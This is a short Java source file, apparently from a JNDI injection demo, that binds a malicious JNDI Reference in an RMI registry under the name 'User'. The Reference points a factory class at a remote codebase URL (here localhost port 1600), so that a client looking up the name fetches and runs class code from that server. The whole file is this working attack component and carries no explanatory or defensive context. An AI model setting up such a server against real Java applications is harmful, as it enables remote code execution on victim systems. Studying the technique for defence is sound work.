package com.dem0.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class UserFactoryServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        Registry registry = LocateRegistry.getRegistry(1099);
        Reference reference = new Reference("com.dem0.jndi.model.xUser", "com.dem0.jndi.model.UserFactor", "http://127.0.0.1:1600");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.rebind("User",wrapper);
    }
}
